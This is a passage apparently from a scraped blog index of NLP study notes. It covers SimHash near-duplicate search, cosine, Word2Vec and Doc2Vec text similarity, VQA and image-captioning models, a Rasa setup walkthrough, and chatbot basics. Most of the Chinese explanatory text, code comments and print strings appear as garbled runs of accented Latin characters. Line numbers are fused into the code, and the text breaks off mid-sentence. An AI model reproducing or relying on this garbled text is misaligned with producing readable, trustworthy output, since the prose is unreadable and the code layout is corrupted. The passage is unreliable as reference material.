123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293class SimhashIndex(object): def __init__(self, objs, f=64, k=2, log=None): \"\"\" ä½¿ç”¨Simhashè¿›è¡Œç›¸ä¼¼å­—ç¬¦ä¸²æ£€ç´¢ `objs` is a list of (obj_id, simhash) obj_id is a string, simhash is an instance of Simhash `f` is the same with the one for Simhash `k` is the tolerance \"\"\" self.k = k self.f = f count = len(objs) if log is None: self.log = logging.getLogger(\"simhash\") else: self.log = log self.log.info('Initializing %s data.', count) self.bucket = collections.defaultdict(set) for i, q in enumerate(objs): if i % 10000 == 0 or i == count - 1: self.log.info('%s/%s', i + 1, count) self.add(*q) def get_near_dups(self, simhash): \"\"\" `simhash` is an instance of Simhash return a list of obj_id, which is in type of str \"\"\" assert simhash.f == self.f ans = set() for key in self.get_keys(simhash): dups = self.bucket[key] self.log.debug('key:%s', key) if len(dups) &gt; 200: self.log.warning('Big bucket found. key:%s, len:%s', key, len(dups)) for dup in dups: sim2, obj_id = dup.split(',', 1) sim2 = Simhash(int(sim2, 16), self.f) d = simhash.distance(sim2) if d &lt;= self.k: ans.add(obj_id) return list(ans) def add(self, obj_id, simhash): \"\"\" `obj_id` is a string `simhash` is an instance of Simhash \"\"\" assert simhash.f == self.f for key in self.get_keys(simhash): v = '%x,%s' % (simhash.value, obj_id) self.bucket[key].add(v) def delete(self, obj_id, simhash): \"\"\" `obj_id` is a string `simhash` is an instance of Simhash \"\"\" assert simhash.f == self.f for key in self.get_keys(simhash): v = '%x,%s' % (simhash.value, obj_id) if v in self.bucket[key]: self.bucket[key].remove(v) @property def offsets(self): \"\"\" You may optimize this method according to &lt;http://www.wwwconference.org/www2007/papers/paper215.pdf&gt; \"\"\" return [self.f // (self.k + 1) * i for i in range(self.k + 1)] def get_keys(self, simhash): for i, offset in enumerate(self.offsets): if i == (len(self.offsets) - 1): m = 2**(self.f - offset) - 1 else: m = 2**(self.offsets[i + 1] - offset) - 1 c = simhash.value &gt;&gt; offset &amp; m yield '%x:%x' % (c, i) def bucket_size(self): return len(self.bucket) 123456789101112131415161718192021222324data = &#123; 1: u'How are you? I am fine. blar blar blar blar blar Thanks.', 2: u'How are you i am fine. blar blar blar blar blar Thanks.', 3: u'This is a simhash test',&#125;# åºå·å’Œhashå€¼ä¿å­˜objs = [(str(k), Simhash(v)) for k, v in data.items()]# å»ºç«‹SimhashIndexå¯¹è±¡ï¼Œ`k` is the toleranceindex = SimhashIndex(objs, k=10)print(\"ç›¸ä¼¼æ–‡æœ¬Bucketæ•°é‡ï¼š\", index.bucket_size())# è¾“å…¥éœ€è¦æŸ¥æ‰¾çš„æ–‡æœ¬çš„hashå€¼ï¼Œget_near_dupsè·å–ç›¸ä¼¼æ–‡æœ¬s1 = Simhash(u'How are you i am fine. blar blar blar blar blar thanks')print(\"ç›¸ä¼¼æ–‡æœ¬idï¼š\", index.get_near_dups(s1))# åŠ å…¥dataæ–‡æœ¬index.add('4', s1)print(\"ç›¸ä¼¼æ–‡æœ¬idï¼š\", index.get_near_dups(s1))s2 = Simhash(u'How are you i am fine. blar blar blar thanks')index.add('5', s2)print(\"ç›¸ä¼¼æ–‡æœ¬idï¼š\", index.get_near_dups(s1)) Cosine Similarity å°†æ–‡æœ¬è½¬åŒ–ä¸ºfeature vectorsã€‚ï¼ˆbag of wordsæˆ–è€…TF-IDFï¼‰ åˆ©ç”¨feature vectorsè®¡ç®—æ–‡æœ¬ç›¸ä¼¼åº¦ 1234567891011from sklearn.feature_extraction.text import CountVectorizerfrom sklearn.metrics.pairwise import cosine_similarity# bowdef bow_cosine(s1, s2): \"\"\"è¿”å›å€¼ä¸ºndarrayç±»å‹\"\"\" vectorizer = CountVectorizer() vectorizer.fit([s1, s2]) # è¯é¢‘ç»Ÿè®¡è¯è¡¨ X = vectorizer.transform([s1, s2]) print(X.toarray()) return cosine_similarity(X[0], X[1]) 12345678from sklearn.feature_extraction.text import TfidfVectorizerdef tfidf_cosine(s1, s2): vectorizer = TfidfVectorizer() vectorizer.fit([s1, s2]) X = vectorizer.transform([s1, s2]) print(X.toarray()) return cosine_similarity(X[0], X[1]) Word2Vec â€‹ åˆ©ç”¨å¥å­ä¸­çš„å•è¯åšWord Averagingè®¡ç®—å¥å­ç›¸ä¼¼åº¦ã€‚ 12345678910111213141516import gensimimport gensim.downloader as apiimport numpy as npfrom sklearn.metrics.pairwise import cosine_similaritymodel = api.load(\"glove-twitter-25\")def wordavg(model, words): \"\"\"è®¡ç®—å¥å­æ¯ä¸ªè¯çš„å¹³å‡è¯å‘é‡\"\"\" res = np.mean([model.get_vector(w) for w in words if w in model.vocab], 0) return ress1_vec = wordavg(model, s1.lower().split())s2_vec = wordavg(model, s2.lower().split())cosine_similarity(s1_vec.reshape((1, -1)), s2_vec.reshape((1, -1))) Doc2Vec â€‹ ç±»ä¼¼word2vecï¼Œåªæ˜¯åœ¨è¾“å…¥æ—¶åŠ å…¥ä¸€ä¸ªå…¨å±€çš„doc vecå’Œword vecä¸€èµ·è¾“å…¥ï¼Œdoc vecç”±doc idå’Œdoc matrixç›¸ä¹˜ç”Ÿæˆã€‚è®¡ç®—æ–¹æ³•æœ‰ä¸¤ç§ï¼ŒDM(Distributed Memory)ç®—æ³•ç±»ä¼¼CBOWï¼ŒDBOW(Distributed Bag of Words)ç±»ä¼¼Skip gram(åªè¾“å…¥doc vecé¢„æµ‹éšæœºæŠ½å–è¯çš„æ¦‚ç‡åˆ†å¸ƒ)ã€‚ gensimå®˜æ–¹æ–‡æ¡£ï¼šhttps://radimrehurek.com/gensim/models/doc2vec.html 1234567891011121314151617181920212223import gensim.models as gfrom gensim.corpora import WikiCorpusimport loggingfrom hanziconv import HanziConvdocvec_size=192class TaggedWikiDocument(object): def __init__(self, wiki): self.wiki = wiki self.wiki.metadata = True def __iter__(self): import jieba # tagsä¿¡æ¯æ˜¯word2vecæ²¡æœ‰çš„ï¼Œè¾…åŠ©è®­ç»ƒ for content, (page_id, title) in self.wiki.get_texts(): yield g.doc2vec.LabeledSentence(words=[w for c in content for w in jieba.cut(HanziConv.toSimplified(c))], tags=[title])def my_function(): zhwiki_name = './data/zhwiki-latest-pages-articles.xml.bz2' wiki = WikiCorpus(zhwiki_name, lemmatize=False, dictionary=&#123;&#125;) documents = TaggedWikiDocument(wiki) model = g.Doc2Vec(documents, dm=0, dbow_words=1, size=docvec_size, window=8, min_count=19, iter=5, workers=8) model.save('data/zhiwiki_news.doc2vec') æ¨¡å‹çš„æ¨æ–­ã€‚æ ¹æ®è¾“å…¥æ–‡æ¡£ï¼Œåœ¨doc matrixçš„ä¸­inferå‡ºæœ€åç»“æœï¼Œè¦æŒ‡å®šinfer_epochã€‚ 123456789101112131415161718192021222324252627282930313233343536import gensim.models as gimport codecsimport numpy as npdef SimlarityCalu(Vector1,Vector2): Vector1Mod=np.sqrt(Vector1.dot(Vector1)) Vector2Mod=np.sqrt(Vector2.dot(Vector2)) if Vector2Mod!=0 and Vector1Mod!=0: simlarity=(Vector1.dot(Vector2))/(Vector1Mod*Vector2Mod) else: simlarity=0 return simlarity#parametersmodel='toy_data/model.bin'test_docs='toy_data/t_docs.txt'output_file='toy_data/test_vectors.txt'#inference hyper-parametersstart_alpha=0.01infer_epoch=1000#load modelm = g.Doc2Vec.load(model)test_docs = [x.strip().split() for x in codecs.open(test_docs, 'r', 'utf-8').readlines()]#infer test vectorsoutput = open(output_file, 'w')a=[]for d in test_docs: output.write(' '.join([str(x) for x in m.infer_vector(d, alpha=start_alpha, steps=infer_epoch)]) + '\\n' ) a.append(m.infer_vector(d, alpha=start_alpha, steps=infer_epoch))output.flush()output.close()print(SimlarityCalu(a[0],a[1]))","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"text similarity","slug":"text-similarity","permalink":"https://racleray.github.io/tags/text-similarity/"},{"name":"word2vec","slug":"word2vec","permalink":"https://racleray.github.io/tags/word2vec/"},{"name":"doc2vec","slug":"doc2vec","permalink":"https://racleray.github.io/tags/doc2vec/"},{"name":"SimHash","slug":"SimHash","permalink":"https://racleray.github.io/tags/SimHash/"}]},{"title":"Vision to text","slug":"Vision-to-text","date":"2020-07-07T09:55:15.000Z","updated":"2023-08-07T11:54:31.035Z","comments":true,"path":"posts/88e9ab16.html","link":"","permalink":"https://racleray.github.io/posts/88e9ab16.html","excerpt":"","text":"è§†è§‰é—®ç­”ä»»åŠ¡çš„å®šä¹‰æ˜¯å¯¹äºä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªè·Ÿè¿™å¹…å›¾ç‰‡ç›¸å…³çš„é—®é¢˜ï¼Œæœºå™¨éœ€è¦æ ¹æ®å›¾ç‰‡ä¿¡æ¯å¯¹é—®é¢˜è¿›è¡Œå›ç­”ã€‚ è¾“å…¥ï¼šä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå…³äºå›¾ç‰‡ä¿¡æ¯çš„é—®é¢˜ï¼Œå¸¸è§çš„é—®é¢˜å½¢å¼æœ‰é€‰æ‹©é¢˜ï¼Œåˆ¤æ–­é¢˜ è¾“å‡ºï¼šæŒ‘é€‰å‡ºæ­£ç¡®ç­”æ¡ˆ â€‹ è§†è§‰é—®ç­”ä»»åŠ¡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¤šæ¨¡æ€çš„ç ”ç©¶é—®é¢˜ã€‚è¿™ä¸ªä»»åŠ¡éœ€è¦æˆ‘ä»¬ç»“åˆè‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰å’Œè®¡ç®—æœºè§†è§‰ï¼ˆCV)çš„æŠ€æœ¯æ¥è¿›è¡Œå›ç­”ã€‚ è‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰ ä¸¾ä¸€ä¸ªåœ¨NLPé¢†åŸŸå¸¸è§çš„åŸºäºæ–‡æœ¬çš„Q&amp;Aé—®é¢˜ï¼šhow many bridges are there in Paris? ä¸€ä¸ªNLP Q&amp;A ç³»ç»Ÿéœ€è¦é¦–å…ˆè¯†åˆ«å‡ºè¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆç±»å‹çš„é—®é¢˜ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯ä¸€ä¸ªâ€œhow manyâ€ å…³äºè®¡æ•°çš„é—®é¢˜ï¼Œæ‰€ä»¥ç­”æ¡ˆåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—ã€‚ä¹‹åç³»ç»Ÿéœ€è¦æå–å‡ºå“ªä¸ªç‰©ä½“ï¼ˆobjectï¼‰éœ€è¦æœºå™¨å»è®¡æ•°ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯ â€œbridgesâ€œã€‚æœ€åéœ€è¦æˆ‘ä»¬æå–å‡ºé—®é¢˜ä¸­çš„èƒŒæ™¯ï¼ˆcontextï¼‰ï¼Œæ¯”å¦‚è¿™ä¸ªé—®é¢˜è®¡æ•°çš„é™å®šèŒƒå›´æ˜¯åœ¨å·´é»è¿™ä¸ªåŸå¸‚ã€‚ å½“ä¸€ä¸ªQ&amp;Aç³»ç»Ÿåˆ†æå®Œé—®é¢˜ï¼Œç³»ç»Ÿéœ€è¦æ ¹æ®çŸ¥è¯†åº“ï¼ˆknowledge baseï¼‰å»å¾—åˆ°ç­”æ¡ˆã€‚ æœºå™¨è§†è§‰ï¼ˆCV) VQAåŒºåˆ«äºä¼ ç»Ÿçš„text QAåœ¨äºæœç´¢ç­”æ¡ˆå’Œæ¨ç†éƒ¨åˆ†éƒ½æ˜¯åŸºäºå›¾ç‰‡çš„å†…å®¹ã€‚æ‰€ä»¥ç³»ç»Ÿéœ€è¦è¿›è¡Œç›®æ ‡æ£€æµ‹ï¼ˆobject detectionï¼‰ï¼Œå†è¿›è¡Œåˆ†ç±»ï¼ˆclassificationï¼‰ï¼Œä¹‹åç³»ç»Ÿéœ€è¦å¯¹å›¾ç‰‡ä¸­ç‰©ä½“ä¹‹é—´çš„å…³ç³»è¿›è¡Œæ¨ç†ã€‚ VQA Notes åŸºäºå›¾åƒä¿¡æ¯å’Œæ–‡æœ¬ä¿¡æ¯åŒ¹é…çš„VQA é€šå¸¸ï¼Œä¸€ä¸ªVQAç³»ç»ŸåŒ…å«äº†ä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š æŠ½å–é—®é¢˜ç‰¹å¾ æŠ½å–å›¾ç‰‡ç‰¹å¾ ç»“åˆå›¾ç‰‡å’Œé—®é¢˜ç‰¹å¾å»ç”Ÿæˆç­”æ¡ˆ image image åŸºäºæ³¨æ„åŠ›ï¼ˆattentionï¼‰çš„VQA â€‹ VQAæ–¹æ¡ˆæ˜¯ä½¿ç”¨ä½ç½®æ³¨æ„åŠ›ï¼ˆspatial attentionï¼‰å»ç”Ÿæˆå…³äºåŒºåŸŸï¼ˆregionï¼‰çš„ä½ç½®ç‰¹å¾ï¼Œå¹¶è®­ç»ƒä¸€ä¸ªCNNç½‘ç»œã€‚ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•å»è·å¾—ä¸€å¼ å›¾ç‰‡å…³äºæ–¹ä½çš„åŒºåŸŸã€‚ åˆ’åˆ†æˆç½‘æ ¼çŠ¶ï¼ˆgridï¼‰ï¼Œå¹¶æ ¹æ®é—®é¢˜ä¸å›¾ç‰‡ç‰¹å¾å»é¢„æµ‹æ¯ä¸€ä¸ªç½‘æ ¼çš„attention weightï¼Œå°†å›¾ç‰‡çš„CNNçš„featureé€šè¿‡åŠ æƒæ±‚å’Œçš„æ–¹å¼å¾—åˆ°attention weighted featureï¼Œå†é€šè¿‡attention weighted featureå‘ç°ç›¸å¯¹æ¯”è¾ƒé‡è¦çš„åŒºåŸŸ ç›®æ ‡è¯†åˆ«çš„æ–¹å¼ç”Ÿæˆå¾ˆå¤šbounding boxã€‚ æ ¹æ®ç”Ÿæˆçš„åŒºåŸŸï¼ˆregionï¼‰ï¼Œä½¿ç”¨é—®é¢˜å»æ‰¾åˆ°æœ€ç›¸å…³çš„åŒºåŸŸï¼Œå¹¶åˆ©ç”¨è¿™äº›åŒºåŸŸå»ç”Ÿæˆç­”æ¡ˆã€‚ Stacked Attention Stacked Attentionï¼Œå¤šæ¬¡é‡å¤question-image attentionã€‚ image å›¾ç‰‡ä½¿ç”¨CNN ç¼–ç  \\[\\phi = CNN(I)\\] é—®é¢˜ä½¿ç”¨LSTMç¼–ç  \\[s= LSTM(E_q)\\] Stacked Attention \\[\\alpha_{c,l} \\propto \\exp F_c(s, \\phi_l) ,~~ \\sum_{l=1}^L \\alpha_{c,l}=1, ~~ x_c = \\sum_l \\alpha_{c,l}\\phi_l\\] classifier, å…¶ä¸­G=[G_1, G_2, ..., G_M]æ˜¯ä¸¤å±‚çš„å…¨è¿æ¥å±‚ \\[P(a_i|I,q) \\propto \\exp G_i(x,s),~~ x=[x_1, x2,...,x_C]\\] Image captioning åŸºæœ¬æ¨¡å‹ â€‹ å¸¸è§çš„image captioning ç³»ç»Ÿæ˜¯ç”±ä¸€ä¸ªCNN+RNNçš„ç¼–ç è§£ç æ¨¡å‹å®Œæˆã€‚ç±»æ¯”ä¸€ä¸‹machine translationç³»ç»Ÿï¼Œé€šå¸¸ç”±ä¸€ä¸ªRNN encoder + RNN decoderç»„æˆã€‚ å›¾åƒç¼–ç  â€‹ Vinyals et al. (2014) Show and Tell: A Neural Image Caption Generator è¿™ç¯‡æ–‡ç« å°†seq2seqæ¨¡å‹ä¸­çš„LSTM encoderæ¢æˆCNN encoderï¼Œç”¨äºæå–å›¾ç‰‡çš„ä¿¡æ¯ï¼Œå¾—åˆ°ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å†…å®¹å‘é‡ï¼ˆcontext vectorï¼‰ï¼Œä¹‹åé€šè¿‡ä¸€ä¸ªRNN decoderï¼Œå°†ä¿¡æ¯ä½¿ç”¨æ–‡å­—çš„æ–¹å¼è§£ç å‡ºæ¥ã€‚ â€‹ ç»“åˆæ³¨æ„åŠ›æœºåˆ¶ - Kelvin et al. (2014) Show, Attend and Tell: Neural Image Caption Generation with Visual Attention ç±»æ¯”äººçœ‹å›¾è¯´è¯ï¼šå½“äººåœ¨è§£è¯´ä¸€å¹…å›¾ç‰‡çš„æ—¶å€™ï¼Œæ¯é¢„æµ‹ä¸€ä¸ªå­—ï¼Œä¼šå…³æ³¨åˆ°å›¾ç‰‡ä¸Šçš„ä¸åŒä½ç½®ã€‚ åœ¨è§£ç å™¨é¢„æµ‹æ–‡å­—çš„æ—¶å€™ï¼Œä¼šå…³æ³¨åˆ°è·Ÿå½“å‰æ–‡å­—å†…å®¹å’Œå›¾ç‰‡æœ€ç›¸å…³çš„ä½ç½®ã€‚ æ³¨æ„åŠ›æœºåˆ¶ ä¸€å¼ å›¾ç‰‡çš„å·ç§¯å±‚ä¸­çš„å‘é‡æœ‰14x14=196ä¸ªfeature maps \\(a_i, i=1...196\\)ï¼Œæ¯ä¸ªfeature mapå¯¹åº”äºæ¯ä¸ªå›¾ç‰‡ä¸­ä¸åŒçš„é«˜äº®ä½ç½®ã€‚ æ³¨æ„åŠ›æœºåˆ¶é€šè¿‡è®¡ç®—æ¯ä¸ªfeature mapä¸å½“å‰çš„hidden stateè®¡ç®—ä¸¤è€…ä¹‹é—´çš„ç›¸å…³åº¦ï¼Œè¿™é‡Œçš„hidden state \\(h_{t-1}\\) æ€»ç»“äº†å·²ç»ç”Ÿæˆçš„1åˆ°t-1ä¸ªå•è¯çš„å†…å®¹ã€‚ \\[e_{ti}=f_{att}(a_i, h_{t-1}) \\\\ \\alpha_{ti} = {\\exp(e_{ti}) \\over \\sum_{k=1}^L \\exp(e_{tk}) }\\] ä¹‹åé€šè¿‡åŠ æƒæ±‚å’Œå¾—åˆ°æ³¨æ„åŠ›å†…å®¹å‘é‡ \\(\\hat{z}_t\\)ã€‚ \\[\\hat{z}_t=\\phi(\\{a_i\\}, \\{\\alpha_i\\})\\] é€šè¿‡å°†196ä¸ªfeature mapsæ±‚å¹³å‡å€¼å»åˆå§‹åŒ–LSTMä¸­çš„ memory cell \\(c_0, h_0\\) æ ¹æ®å›¾ç‰‡åŠå·²ç»ç”Ÿæˆçš„éƒ¨åˆ†å•è¯ï¼Œå»é¢„æµ‹ä¸‹ä¸€ä¸ªå•è¯ \\[c_0 = f_{init,c}({1\\over L} \\sum_i^L a_i) \\\\ h_0 = f_{init,h}({1\\over L} \\sum_i^L a_i) \\\\ p(y_t|a, y_1^{t-1}) \\propto \\exp(L_o (E y_{t-1} + L_h h_t + L_z \\hat{z}_t))\\] show attention and tell beam search ä¼˜åŒ– â€‹ æ¯æ¬¡é¢„æµ‹ä¸‹ä¸€ä¸ªå•è¯çš„æ—¶å€™ï¼Œè®¡ç®—å½“å‰æ‰€æœ‰è·¯å¾„çš„log-likelihoodå¹¶è¿›è¡Œæ’åº, åªä¿ç•™log-likelihood æœ€å¤§å€¼çš„Kä¸ªbeamsã€‚ ç›®æ ‡è¯†åˆ« â€‹ Fang et al 2014ï¼Œ From Captions to Visual Concepts and Back, æä¾›äº†å¦ä¸€ä¸ªimage captionç³»ç»Ÿçš„æ€è·¯ã€‚ é¢„æµ‹æ–‡å­—ï¼š ä½¿ç”¨ä¸€ä¸ªCNNå»åšç›®æ ‡è¯†åˆ«ï¼Œå¹¶ä¸”æ ¹æ®bounding boxç”Ÿæˆå¯èƒ½å‡ºç°çš„æ–‡å­— ç”Ÿæˆå¥å­ï¼šé€šè¿‡ä¸€ä¸ªç»Ÿè®¡è¯­è¨€æ¨¡å‹ï¼Œç”Ÿæˆå¾ˆå¤šä¸ªå¯èƒ½çš„å¥å­é›†åˆ é‡æ–°æ’åºå·²ç»ç”Ÿæˆçš„å¥å­ï¼š é€šè¿‡å­¦ä¹ ä¸€ä¸ªDeep Multimodal Similarity Model ï¼ˆDMSMï¼‰å»é‡æ–°æ’åºæ‰€æœ‰å¯èƒ½çš„å¥å­é›†åˆï¼Œå–æœ€é«˜åˆ†æ•°çš„å¥å­ä½œä¸ºç³»ç»Ÿè¾“å‡ºã€‚ è¯„ä¼°æŒ‡æ ‡ å¸¸è§çš„image captioning ç³»ç»Ÿçš„è¯„ä¼°æŒ‡æ ‡ä½¿ç”¨çš„æ˜¯ BLEUï¼Œ æ˜¯å¸¸è§çš„æœºå™¨ç¿»è¯‘ç³»ç»Ÿçš„è¯„ä¼°æŒ‡æ ‡ï¼Œè®¡ç®—çš„æ˜¯ä¸€å¥é¢„æµ‹çš„æ–‡å­—ä¸äººç±»æ ‡æ³¨çš„å‚è€ƒæ–‡å­—ä¹‹é—´çš„n-gram é‡åˆåº¦ï¼ˆoverlapï¼‰ã€‚ METEORï¼Œ ä¹Ÿæ˜¯å¸¸è§çš„æœºå™¨ç¿»è¯‘ç³»ç»Ÿçš„è¯„ä¼°æŒ‡æ ‡ï¼Œå…¶é€šè¿‡å»ºç«‹ä¸€ä¸ªçŸ­è¯­è¯è¡¨ï¼ˆphrase tableï¼‰ï¼Œè€ƒè™‘äº†è¾“å‡ºæ–‡æœ¬æ˜¯å¦ä½¿ç”¨äº†ç›¸ä¼¼çŸ­è¯­ã€‚ CIDErï¼Œ è€ƒè™‘äº†å¥å­ä¸­çš„æ–‡å­—ä¸å›¾ç‰‡çš„ç›¸å…³æ€§ ROUGE-Lï¼Œæ˜¯text summarizationçš„è¯„ä¼°æŒ‡æ ‡ SPICE æ˜¯ä¸“é—¨è®¾è®¡å‡ºæ¥ç”¨äº image caption é—®é¢˜çš„ã€‚å…¨ç§°æ˜¯ Semantic Propositional Image Caption Evaluationã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"visual text","slug":"visual-text","permalink":"https://racleray.github.io/tags/visual-text/"}]},{"title":"Rasa Notes","slug":"Rasa-Notes","date":"2020-07-07T09:47:25.000Z","updated":"2023-08-07T11:54:31.034Z","comments":true,"path":"posts/1b390165.html","link":"","permalink":"https://racleray.github.io/posts/1b390165.html","excerpt":"RASAå·¥å…·çš„ç®€çŸ­æ–°æ‰‹tutorialã€‚","text":"rasa_nluè®­ç»ƒæ•°æ®çš„ç”Ÿæˆ å¯¹è¯ç³»ç»Ÿçš„å†·å¯åŠ¨éƒ½ä¼šé‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼Œæ²¡æœ‰æ•°æ®ã€‚ ä½¿ç”¨chatitoæ¥ç”Ÿæˆrasa_nluæ„å›¾è¯†åˆ«éœ€è¦çš„æ•°æ®ã€‚è¿™ä¸ªæ•°æ®éœ€è¦ååå¤å¤çš„ä¿®æ”¹å’Œå®Œå–„ã€‚ Chatito doc åœ¨äº§ç”Ÿè®­ç»ƒæ•°æ®çš„æ—¶å€™éœ€è¦ç¡®å®šçš„nluçš„æ„å›¾å’Œå®ä½“ç±»åˆ«ï¼Œéœ€è¦åœ¨domain.ymlæ–‡ä»¶ä¸­é…ç½®intentså’Œentitiesã€‚ å®˜æ–¹DOC https://rasa.com/docs/rasa/core/policies/ mini rasa tutorial åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›® æŸ¥çœ‹NLUåŸ¹è®­æ•°æ® å®šä¹‰æ¨¡å‹é…ç½®ï¼Œå†™ä¸‹ç¬¬ä¸€ä¸ªæ•…äº‹Story å®šä¹‰è¿™ä¸ªæ•…äº‹storyçš„ä½œç”¨åŸŸdomain è®­ç»ƒæ¨¡å‹ æµ‹è¯•ä½ å†™å¥½çš„åŠ©æ‰‹ åˆ›å»ºæ–°é¡¹ç›® è·¯å¾„æŒ‡å‘ä¸€ä¸ªæ–°çš„ç©ºæ–‡ä»¶å¤¹ cd path/to/a/blank/folder åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢åˆ›å»ºæ–°çš„rasaé¡¹ç›® rasa init --no-prompt æ–‡ä»¶å¤¹ä¸­å°†ä¼šç”Ÿæˆä»¥ä¸‹çš„æ–‡ä»¶ï¼š init.py ç©ºæ–‡ä»¶ç”¨äºå®šä½ actions.py ç”¨äºå®šä¹‰åŠ¨ä½œï¼ˆè‡ªå®šä¹‰è„šæœ¬ä»£ç ï¼‰ config.yml é…ç½®NLUå’Œcoreæ¨¡å‹ credentials.yml è¿æ¥åˆ°å…¶ä»–æœåŠ¡å™¨çš„ç»†èŠ‚ï¼ˆä¸å¸¸ç”¨ï¼‰ data/nlu.md è‡ªå®šä¹‰NLUè®­ç»ƒæ•°æ® data/stories.md è‡ªå®šä¹‰stories domain.yml åŠ©æ‰‹çš„å®šä¹‰åŸŸdomian endpoints.yml è¿æ¥åˆ°fb messageç­‰çš„è½¨é“ï¼ˆä¸å¸¸ç”¨ï¼‰ models/.tar.gz æ¨¡å‹åŠå…¶å‚æ•°æ–‡ä»¶ è‡ªå®šä¹‰çš„NLUæ¨¡å‹ è‡ªå®šä¹‰NLUè®­ç»ƒæ•°æ® 1cat data/nlu.md è‡ªå®šä¹‰stories æŸ¥çœ‹å†™å¥½çš„stories 1cat data/stories.md è‡ªå®šä¹‰åŠ¨ä½œacitons actionsæœ‰ä¸¤ç§ç±»å‹ï¼š ç›´æ¥å›å¤ï¼Œåœ¨domain.ymlä¸­å®šä¹‰templete è‡ªå®šä¹‰æ“ä½œï¼Œåœ¨aciton.pyæ–‡ä»¶ä¸­æ·»åŠ  è‡ªå®šä¹‰domain 1cat domain.yml intentsï¼šç”¨æˆ·æ„å›¾ entitiesï¼šå®ä½“ slotsï¼šæ§½ actionsï¼šåŠ©æ‰‹è¯´å’Œåšçš„äº‹æƒ… templatesï¼šåŠ©æ‰‹æ ¹æ®actionså…·ä½“è¦åšçš„äº‹æƒ… å®šä¹‰æ¨¡å‹é…ç½® é…ç½®æ–‡ä»¶config.yml police: coreï¼Œå†³å®šå¯¹è¯çŠ¶æ€è·Ÿè¸ªç­–ç•¥ pipeline: NLUï¼ŒNatural Language Understanding and Intent Classificationï¼Œç†è§£å½“å‰ç”¨æˆ·è¾“å…¥ï¼Œæå–æ„å›¾ã€‚ 12345678910language: \"zh\"pipeline: - name: \"JiebaTokenizer\"policies: - name: FallbackPolic fallback_action_name: 'action_default_fallback' nlu_threshold: 0.5 core_threshold: 0.3 è®­ç»ƒæ¨¡å‹ ä½¿ç”¨dataä¸‹é¢çš„è®­ç»ƒæ•°æ® -- core/ -- stories.md -- nlu/ -- nlu.json è‡ªåŠ¨å¯¹æ¨¡å‹è¿›è¡Œè®­ç»ƒï¼Œè®­ç»ƒå¥½çš„æ¨¡å‹å°†ä¼šè¢«æ‰“ä¸Šæ—¶é—´æˆ³time stampä½œä¸ºæ–°çš„æ¨¡å‹ï¼Œä¿å­˜åœ¨modelsç›®å½•ä¸‹é¢ rasa train SHELLå¯åŠ¨ rasa shell å¯è§†åŒ–ç•Œé¢ rasa x","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"rasa","slug":"rasa","permalink":"https://racleray.github.io/tags/rasa/"}]},{"title":"ChatBot Simple Notes","slug":"ChatBot-Notes","date":"2020-07-07T09:42:09.000Z","updated":"2023-08-07T11:54:31.028Z","comments":true,"path":"posts/fc0185e8.html","link":"","permalink":"https://racleray.github.io/posts/fc0185e8.html","excerpt":"ç²—æµ…çš„Chat Botç›¸å…³ä¿¡æ¯è®°å½•ã€‚","text":"åŸºäºæ£€ç´¢æŠ€æœ¯çš„æ¨¡å‹ VS ç”Ÿæˆå¼æ¨¡å‹ â€‹ åŸºäºæ£€ç´¢æŠ€æœ¯çš„æ¨¡å‹è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ˜¯æ ¹æ®ç”¨æˆ·çš„è¾“å…¥å’Œä¸Šä¸‹æ–‡å†…å®¹ï¼Œä½¿ç”¨äº†çŸ¥è¯†åº“ï¼ˆå­˜å‚¨äº†äº‹å…ˆå®šä¹‰å¥½çš„å›å¤å†…å®¹ï¼‰å’Œä¸€äº›å¯å‘å¼æ–¹æ³•æ¥å¾—åˆ°ä¸€ä¸ªåˆé€‚çš„å›å¤ã€‚å¯å‘å¼æ–¹æ³•ç®€å•çš„æœ‰åŸºäºè§„åˆ™çš„è¡¨è¾¾å¼åŒ¹é…ï¼Œå¤æ‚çš„æœ‰ä¸€äº›æœºå™¨å­¦ä¹ é‡Œçš„åˆ†ç±»å™¨ã€‚è¿™äº›ç³»ç»Ÿä¸èƒ½å¤Ÿç”Ÿæˆä»»ä½•æ–°çš„å†…å®¹ï¼Œåªæ˜¯ä»ä¸€ä¸ªå›ºå®šçš„æ•°æ®é›†ä¸­æ‰¾åˆ°åˆé€‚çš„å†…å®¹ä½œä¸ºå›å¤ã€‚ â€‹ å¯¹äºåŸºäºæ£€ç´¢æŠ€æœ¯çš„æ¨¡å‹ï¼Œå›å¤çš„å†…å®¹è¯­æ³•ä¸Šè¾ƒä¸ºé€šé¡ºï¼Œè¾ƒå°‘å‡ºç°è¯­æ³•é”™è¯¯ï¼Œ ä¸èƒ½ç»“åˆä¸Šä¸‹æ–‡ç»™å‡ºå›å¤ã€‚ â€‹ ç”Ÿæˆå¼æ¨¡å‹å…¸å‹çš„æœ‰åŸºäºæœºå™¨ç¿»è¯‘æ¨¡å‹çš„ï¼Œä¸ä¼ 